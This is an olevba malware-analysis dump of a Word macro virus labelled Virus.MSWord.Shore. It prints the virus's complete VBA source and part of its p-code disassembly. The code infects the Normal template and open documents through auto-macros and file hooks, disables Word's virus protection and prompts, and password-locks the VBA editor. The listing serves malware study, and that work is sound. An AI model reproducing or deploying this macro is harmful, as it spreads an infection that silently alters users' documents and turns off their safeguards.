olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shore
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shore - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Offee.bas 
in file: Virus.MSWord.Shore - OLE stream: 'Macros/VBA/Offee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'Thanks to cyberHack, Astia, Marker, etc.
'I love ITS
'
'Public declaration
'
'
Public Const SeriesNumber = 990910
Public Const ModuleName = "Offee", mw = "Microsoft Word", _
        OFC = "Offshore Engineering", _
        Peace = "Peace at the sea...", _
        SerNum$ = "Series Number", _
        pass = "Password : ", _
        badboy = "Want to be a bad boy....", _
        scrollCap = "Normal." & ModuleName & ".scrollCaption"

Public Const msg = "Unable to get the access. Request aborted...", _
        aaa = "§·_n²__", bbb = "wenni", ccc = "cool9908", _
        abadacc = "Bad access...", _
        code = "backbone130274", ddd = "junkies9908", eee = "Timor9909"

Public anCap As String, anInt As Single, anPos As Integer, Animated As Boolean, _
        ToolsOptionsDlg As Dialog, _
        OrganizerDlg As Dialog, _
        ToolsTemplatesDlg As Dialog, _
        ToolsMacrosDlg As Dialog, _
        FormatStyleDlg As Dialog

'procedures in Offe module
Sub Buggy()
Dim aDocProp As DocumentProperty
    For Each aDocProp In NormalTemplate.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
    
    NormalTemplate.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False
End Sub


Function getDocPropExist(theObject As Object) As Boolean
Dim adp As DocumentProperty
    getDocPropExist = False
    For Each adp In theObject.CustomDocumentProperties
    With adp
        If .Name = SerNum$ And .Type = msoPropertyTypeNumber And _
            .Value = SeriesNumber Then
            getDocPropExist = True
            Exit Function
        End If
    End With
    Next adp
End Function

Function getModuleExist(theObject As Object) As Boolean
Dim aDocProp As DocumentProperty
    getModuleExist = False
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name = ModuleName Then
            getModuleExist = True
            Exit Function
        End If
    Next anObject
End Function
    
Function getInfected(theObject As Object) As Boolean
    getInfected = getModuleExist(theObject) And getDocPropExist(theObject)
End Function

Sub clearMacros(theObject As Object)
Dim aDocProp As DocumentProperty
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=theObject.FullName, _
            Name:=anObject.Name, Object:=wdOrganizerObjectProjectItems
        Else
            On Error Resume Next
            With anObject.CodeModule
                .DeleteLines 1, .CountOfLines
            End With
        End If
    Next anObject
    
    For Each aDocProp In theObject.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
End Sub

Sub copyMacros(theSource As Object, theDestination As Object)
Dim aDocProp As DocumentProperty
    If Not getDocPropExist(theDestination) Then _
        theDestination.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False

    On Error Resume Next
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=ModuleName, _
            Object:=wdOrganizerObjectProjectItems
End Sub

Sub Infecting(theSource As Object, theDestination As Object)
    On Error Resume Next
    If Not getInfected(theDestination) Then
        Application.OrganizerRename _
            Source:=theDestination.FullName, _
            Name:=ModuleName, newname:="xxxx", _
            Object:=wdOrganizerObjectProjectItems
        clearMacros theDestination
        copyMacros theSource, theDestination
        On Error Resume Next
        theDestination.Save True
    End If
End Sub

Sub Copy2Normal()
Dim ATemp As Template
    Stealth
    If Documents.Count > 0 Then
        Infecting ActiveDocument, NormalTemplate
        If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
            Infecting ActiveDocument, ActiveDocument.AttachedTemplate
        For Each ATemp In Templates
            Infecting ActiveDocument, ATemp
        Next ATemp
    End If
    
    With NormalTemplate.VBProject.VBComponents(1).CodeModule
        .DeleteLines 1, .CountOfLines
    End With
End Sub

Sub Copy2Document()
Dim Adoc As Document
    Stealth
    For Each Adoc In Documents
        Infecting NormalTemplate, Adoc
        On Error Resume Next
        WordBasic.viewpage
    Next Adoc
    If Documents.Count > 0 Then _
    If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
        Infecting NormalTemplate, ActiveDocument.AttachedTemplate
End Sub

Sub Jump2Normal(macName As String)
    Application.Run "normal." & ModuleName & "." & macName
End Sub

'infection procedures
Sub AutoOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    
    If getModuleExist(NormalTemplate) Then
        Jump2Normal ("Copy2Document")
        If Documents.Count > 0 Then
            On Error Resume Next
            ActiveDocument.Save
        End If
    Else
        Copy2Normal
        On Error Resume Next
        NormalTemplate.Save
    End If
End Sub

Sub FileOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    AnimateCaption
    
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        AutoOpen
        On Error Resume Next
        ActiveDocument.Saved = True
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoClose()
    AnimateCaption
    Stealth
    On Error Resume Next
'    AutoOpen
    Copy2Document
    If Not ActiveDocument.Saved And ActiveDocument.Characters.Count > 0 Then ActiveDocument.Save
    ActiveDocument.Saved = True
    ModifyAttr ActiveDocument.FullName
End Sub

Sub FileClose()
Dim afn As String
    AnimateCaption
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    AutoClose
    afn = ActiveDocument.FullName
    ActiveDocument.Close
    ModifyAttr afn
    WordBasic.DisableAutoMacros False
End Sub

Sub FileSave()
    AnimateCaption
    WordBasic.DisableAutoMacros True
    
    Copy2Document
    On Error Resume Next
    With ActiveDocument
        .Save
        .Saved = True
    End With
    WordBasic.DisableAutoMacros False
End Sub



Sub InitDialog()
    Stealth
    Application.DisplayAlerts = wdAlertsNone
    On Error Resume Next
    Set ToolsOptionsDlg = Dialogs(wdDialogToolsOptions)
    Set OrganizerDlg = Dialogs(wdDialogOrganizer)
    Set ToolsTemplatesDlg = Dialogs(wdDialogToolsTemplates)
    Set ToolsMacrosDlg = Dialogs(wdDialogToolsMacro)
    Set FormatStyleDlg = Dialogs(wdDialogFormatStyle)
End Sub
    
    
Sub AutoExec()
Dim Combar As CommandBar
    WordBasic.DisableAutoMacros True
    InitDialog
    Animated = False
    AnimateCaption
    Copy2Normal
    If getInfected(NormalTemplate) Then Copy2Document
    ModifyAttr NormalTemplate.FullName
    Buggy
    For Each Combar In Application.CommandBars
        Combar.reset
    Next Combar
End Sub

Sub AutoExit()
    AutoOpen
    AnimateCaption
    ModifyAttr NormalTemplate.FullName
End Sub

Sub fileNewDefault()
    AnimateCaption
    WordBasic.fileNewDefault
    Copy2Document
End Sub

Sub FileNew()
    If Dialogs(wdDialogFileNew).Show <> 0 Then
        AnimateCaption
        Copy2Document
    End If
End Sub

Sub Stealth()
    With Options
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
End Sub

Sub NoStealth()
    With Options
        .SaveNormalPrompt = True
        .SavePropertiesPrompt = True
        .VirusProtection = True
    End With
End Sub

Sub ToolsOptions()
    InitDialog
    NoStealth
    On Error Resume Next
    ToolsOptionsDlg.Display
    AnimateCaption
    Stealth
End Sub


Sub NoAccess()
    a = MsgBox(msg, vbExclamation, abadacc)
    AnimateCaption
End Sub

Function passDialog() As Boolean
Dim cruel As String
    passDialog = False
    cruel = ccc + Mid(code, 9, 2)
    If LCase(InputBox(pass, badboy)) = cruel Then
        passDialog = True
    Else
        NoAccess
    End If
End Function


Sub ToolsMacro()
    InitDialog
    ToolsMacrosDlg.Display
    AnimateCaption
End Sub


Sub FileTemplates()
    InitDialog
    ToolsTemplatesDlg.Display
'    CustomizationContext = NormalTemplate
    AnimateCaption
End Sub

Sub viewvbcode()
    Application.ShowVisualBasicEditor = passDialog
End Sub

Sub viewcode()
    viewvbcode
End Sub

Sub Organizer()
    InitDialog
    OrganizerDlg.Display
    AnimateCaption
End Sub

Sub FormatStyle()
    InitDialog
    With FormatStyleDlg
        .Display
        .Execute
    End With
    AnimateCaption
End Sub


Sub ModifyAttr(fileName As String)
    On Error Resume Next
    If GetAttr(fileName) <> vbArchive Then SetAttr fileName, vbArchive
End Sub

Sub AnimateCaption()
    On Error Resume Next
    If Documents.Count > 0 Then WordBasic.viewpage
    If Animated Then Exit Sub
    anIntv = 0.5
    anPos = 0
    anCap = OFC
    Application.OnTime Now + TimeSerial(0, 0, 3), scrollCap
    Animated = True
End Sub


Sub ScrollCaption()
    If Animated Then
        Application.Caption = Right$(anCap, anPos)
        Application.OnTime Now + TimeSerial(0, 0, anIntv), scrollCap
        anPos = anPos + 1
    End If
    
    If anPos > Len(anCap) Then
        On Error Resume Next
        WordBasic.viewpage
        
        anPos = 0
        If anCap = OFC Then
            anCap = Peace
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = Peace Then
            anCap = mw
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = mw Then
            anCap = OFC
            Application.OnTime Now + TimeSerial(0, 0, 1200), scrollCap
            Animated = False
        End If
    End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Shore
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Offee - 17375 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1:
' 	QuoteRem 0x0000 0x0028 "Thanks to cyberHack, Astia, Marker, etc."
' Line #2:
' 	QuoteRem 0x0000 0x000A "I love ITS"
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
' Line #4:
' 	QuoteRem 0x0000 0x0012 "Public declaration"
' Line #5:
' 	QuoteRem 0x0000 0x0000 ""
' Line #6:
' 	QuoteRem 0x0000 0x0000 ""
' Line #7:
' 	Dim (Public Const) 
' 	LitDI4 0x1EBE 0x000F 
' 	VarDefn SeriesNumber
' Line #8:
' 	LineCont 0x0018 0A 00 08 00 0E 00 08 00 12 00 08 00 16 00 08 00 1A 00 08 00 1E 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x0005 "Offee"
' 	VarDefn ModuleName
' 	LitStr 0x000E "Microsoft Word"
' 	VarDefn mw
' 	LitStr 0x0014 "Offshore Engineering"
' 	VarDefn OFC
' 	LitStr 0x0013 "Peace at the sea..."
' 	VarDefn Peace
' 	LitStr 0x000D "Series Number"
' 	VarDefn SerNum
' 	LitStr 0x000B "Password : "
' 	VarDefn pass
' 	LitStr 0x0018 "Want to be a bad boy...."
' 	VarDefn badboy
' 	LitStr 0x0007 "Normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x000E ".scrollCaption"
' 	Concat 
' 	VarDefn scrollCap
' Line #9:
' Line #10:
' 	LineCont 0x000C 06 00 08 00 12 00 08 00 16 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x002C "Unable to get the access. Request aborted..."
' 	VarDefn msg
' 	LitStr 0x0007 "§·_n²__"
' 	VarDefn aaa
' 	LitStr 0x0005 "wenni"
' 	VarDefn bbb
' 	LitStr 0x0008 "cool9908"
' 	VarDefn ccc
' 	LitStr 0x000D "Bad access..."
' 	VarDefn abadacc
' 	LitStr 0x000E "backbone130274"
' 	VarDefn code
' 	LitStr 0x000B "junkies9908"
' 	VarDefn ddd
' 	LitStr 0x0009 "Timor9909"
' 	VarDefn eee
' Line #11:
' Line #12:
' 	LineCont 0x0014 11 00 08 00 15 00 08 00 19 00 08 00 1D 00 08 00 21 00 08 00
' 	Dim (Public) 
' 	VarDefn anCap (As String)
' 	VarDefn anInt (As Single)
' 	VarDefn anPos (As Integer)
' 	VarDefn Animated (As Boolean)
' 	VarDefn ToolsOptionsDlg
' 	VarDefn OrganizerDlg
' 	VarDefn ToolsTemplatesDlg
' 	VarDefn ToolsMacrosDlg
' 	VarDefn FormatStyleDlg
' Line #13:
' Line #14:
' 	QuoteRem 0x0000 0x0019 "procedures in Offe module"
' Line #15:
' 	FuncDefn (Sub Buggy())
' Line #16:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #17:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #18:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #19:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' Line #21:
' 	LineCont 0x0010 05 00 0C 00 09 00 0C 00 0D 00 0C 00 11 00 0C 00
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #22:
' 	EndSub 
' Line #23:
' Line #24:
' Line #25:
' 	FuncDefn (Function getDocPropExist(theObject As Object) As Boolean)
' Line #26:
' 	Dim 
' 	VarDefn adp (As DocumentProperty)
' Line #27:
' 	LitVarSpecial (False)
' 	St getDocPropExist 
' Line #28:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #29:
' 	StartWithExpr 
' 	Ld adp 
' 	With 
' Line #30:
' 	LineCont 0x0004 0B 00 0C 00
' 	MemLdWith New 
' 	Ld SerNum$ 
' 	Eq 
' 	MemLdWith TypeOf 
' 	Ld msoPropertyTypeNumber 
' 	Eq 
' 	And 
' 	MemLdWith Value 
' 	Ld SeriesNumber 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #31:
' 	LitVarSpecial (True)
' 	St getDocPropExist 
' Line #32:
' 	ExitFunc 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndWith 
' Line #35:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	EndFunc 
' Line #37:
' Line #38:
' 	FuncDefn (Function getModuleExist(theObject As Object) As Boolean)
' Line #39:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #40:
' 	LitVarSpecial (False)
' 	St getModuleExist 
' Line #41:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #42:
' 	Ld anObject 
' 	MemLd New 
' 	Ld ModuleName 
' 	Eq 
' 	IfBlock 
' Line #43:
' 	LitVarSpecial (True)
' 	St getModuleExist 
' Line #44:
' 	ExitFunc 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	EndFunc 
' Line #48:
' Line #49:
' 	FuncDefn (Function getInfected(theObject As Object) As Boolean)
' Line #50:
' 	Ld theObject 
' 	ArgsLd getModuleExist 0x0001 
' 	Ld theObject 
' 	ArgsLd getDocPropExist 0x0001 
' 	And 
' 	St getInfected 
' Line #51:
' 	EndFunc 
' Line #52:
' Line #53:
' 	FuncDefn (Sub clearMacros(theObject As Object))
' Line #54:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #55:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #56:
' 	Ld anObject 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #57:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld theObject 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld anObject 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #58:
' 	ElseBlock 
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	StartWithExpr 
' 	Ld anObject 
' 	MemLd CodeModule 
' 	With 
' Line #61:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #62:
' 	EndWith 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' Line #66:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #67:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #68:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' 	EndSub 
' Line #70:
' Line #71:
' 	FuncDefn (Sub copyMacros(theSource As Object, theDestination As Object))
' Line #72:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #73:
' 	LineCont 0x0014 07 00 08 00 0C 00 0C 00 10 00 0C 00 14 00 0C 00 18 00 0C 00
' 	Ld theDestination 
' 	ArgsLd getDocPropExist 0x0001 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld theDestination 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' 	EndIf 
' Line #74:
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld theSource 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #77:
' 	EndSub 
' Line #78:
' Line #79:
' 	FuncDefn (Sub Infecting(theSource As Object, theDestination As Object))
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	Ld theDestination 
' 	ArgsLd getInfected 0x0001 
' 	Not 
' 	IfBlock 
' Line #82:
' 	LineCont 0x000C 03 00 0C 00 09 00 0C 00 11 00 0C 00
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	LitStr 0x0004 "xxxx"
' 	ParamNamed newname 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #83:
' 	Ld theDestination 
' 	ArgsCall clearMacros 0x0001 
' Line #84:
' 	Ld theSource 
' 	Ld theDestination 
' 	ArgsCall copyMacros 0x0002 
' Line #85:
' 	OnError (Resume Next) 
' Line #86:
' 	LitVarSpecial (True)
' 	Ld theDestination 
' 	ArgsMemCall Save 0x0001 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	EndSub 
' Line #89:
' Line #90:
' 	FuncDefn (Sub Copy2Normal())
' Line #91:
' 	Dim 
' 	VarDefn ATemp (As Template)
' Line #92:
' 	ArgsCall Stealth 0x0000 
' Line #93:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #94:
' 	Ld ActiveDocument 
' 	Ld NormalTemplate 
' 	ArgsCall Infecting 0x0002 
' Line #95:
' 	LineCont 0x0004 07 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' Line #96:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #97:
' 	Ld ActiveDocument 
' 	Ld ATemp 
' 	ArgsCall Infecting 0x0002 
' Line #98:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	NextVar 
' Line #99:
' 	EndIfBlock 
' Line #100:
' Line #101:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #102:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #103:
' 	EndWith 
' Line #104:
' 	EndSub 
' Line #105:
' Line #106:
' 	FuncDefn (Sub Copy2Document())
' Line #107:
' 	Dim 
' 	VarDefn Adoc (As Document)
' Line #108:
' 	ArgsCall Stealth 0x0000 
' Line #109:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #110:
' 	Ld NormalTemplate 
' 	Ld Adoc 
' 	ArgsCall Infecting 0x0002 
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' Line #113:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	LineCont 0x0008 07 00 04 00 0E 00 08 00
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' 	EndIf 
' Line #115:
' 	EndSub 
' Line #116:
' Line #117:
' 	FuncDefn (Sub Jump2Normal(macName As String))
' Line #118:
' 	LitStr 0x0007 "normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld macName 
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #119:
' 	EndSub 
' Line #120:
' Line #121:
' 	QuoteRem 0x0000 0x0014 "infection procedures"
' Line #122:
' 	FuncDefn (Sub AutoOpen())
' Line #123:
' 	ArgsCall Stealth 0x0000 
' Line #124:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #125:
' Line #126:
' 	Ld NormalTemplate 
' 	ArgsLd getModuleExist 0x0001 
' 	IfBlock 
' Line #127:
' 	LitStr 0x000D "Copy2Document"
' 	Paren 
' 	ArgsCall Jump2Normal 0x0001 
' Line #128:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #129:
' 	OnError (Resume Next) 
' Line #130:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	ElseBlock 
' Line #133:
' 	ArgsCall Copy2Normal 0x0000 
' Line #134:
' 	OnError (Resume Next) 
' Line #135:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #136:
' 	EndIfBlock 
' Line #137:
' 	EndSub 
' Line #138:
' Line #139:
' 	FuncDefn (Sub FileOpen())
' Line #140:
' 	ArgsCall Stealth 0x0000 
' Line #141:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #142:
' 	ArgsCall AnimateCaption 0x0000 
' Line #143:
' Line #144:
' 	OnError (Resume Next) 
' Line #145:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #146:
' 	ArgsCall AutoOpen 0x0000 
' Line #147:
' 	OnError (Resume Next) 
' Line #148:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #149:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #152:
' 	EndSub 
' Line #153:
' Line #154:
' 	FuncDefn (Sub AutoClose())
' Line #155:
' 	ArgsCall AnimateCaption 0x0000 
' Line #156:
' 	ArgsCall Stealth 0x0000 
' Line #157:
' 	OnError (Resume Next) 
' Line #158:
' 	QuoteRem 0x0000 0x000C "    AutoOpen"
' Line #159:
' 	ArgsCall Copy2Document 0x0000 
' Line #160:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #161:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #162:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #163:
' 	EndSub 
' Line #164:
' Line #165:
' 	FuncDefn (Sub FileClose())
' Line #166:
' 	Dim 
' 	VarDefn afn (As String)
' Line #167:
' 	ArgsCall AnimateCaption 0x0000 
' Line #168:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #169:
' 	OnError (Resume Next) 
' Line #170:
' 	ArgsCall AutoClose 0x0000 
' Line #171:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St afn 
' Line #172:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #173:
' 	Ld afn 
' 	ArgsCall ModifyAttr 0x0001 
' Line #174:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #175:
' 	EndSub 
' Line #176:
' Line #177:
' 	FuncDefn (Sub FileSave())
' Line #178:
' 	ArgsCall AnimateCaption 0x0000 
' Line #179:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #180:
' Line #181:
' 	ArgsCall Copy2Document 0x0000 
' Line #182:
' 	OnError (Resume Next) 
' Line #183:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #184:
' 	ArgsMemCallWith Save 0x0000 
' Line #185:
' 	LitVarSpecial (True)
' 	MemStWith Saved 
' Line #186:
' 	EndWith 
' Line #187:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #188:
' 	EndSub 
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' 	FuncDefn (Sub InitDialog())
' Line #193:
' 	ArgsCall Stealth 0x0000 
' Line #194:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #195:
' 	OnError (Resume Next) 
' Line #196:
' 	SetStmt 
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsOptionsDlg 
' Line #197:
' 	SetStmt 
' 	Ld wdDialogOrganizer 
' 	ArgsLd Dialogs 0x0001 
' 	Set OrganizerDlg 
' Line #198:
' 	SetStmt 
' 	Ld wdDialogToolsTemplates 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsTemplatesDlg 
' Line #199:
' 	SetStmt 
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsMacrosDlg 
' Line #200:
' 	SetStmt 
' 	Ld wdDialogFormatStyle 
' 	ArgsLd Dialogs 0x0001 
' 	Set FormatStyleDlg 
' Line #201:
' 	EndSub 
' Line #202:
' Line #203:
' Line #204:
' 	FuncDefn (Sub AutoExec())
' Line #205:
' 	Dim 
' 	VarDefn Combar (As CommandBar)
' Line #206:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #207:
' 	ArgsCall InitDialog 0x0000 
' Line #208:
' 	LitVarSpecial (False)
' 	St Animated 
' Line #209:
' 	ArgsCall AnimateCaption 0x0000 
' Line #210:
' 	ArgsCall Copy2Normal 0x0000 
' Line #211:
' 	Ld NormalTemplate 
' 	ArgsLd getInfected 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Copy2Document 0x0000 
' 	EndIf 
' Line #212:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #213:
' 	ArgsCall Buggy 0x0000 
' Line #214:
' 	StartForVariable 
' 	Ld Combar 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ForEach 
' Line #215:
' 	Ld Combar 
' 	ArgsMemCall reset 0x0000 
' Line #216:
' 	StartForVariable 
' 	Ld Combar 
' 	EndForVariable 
' 	NextVar 
' Line #217:
' 	EndSub 
' Line #218:
' Line #219:
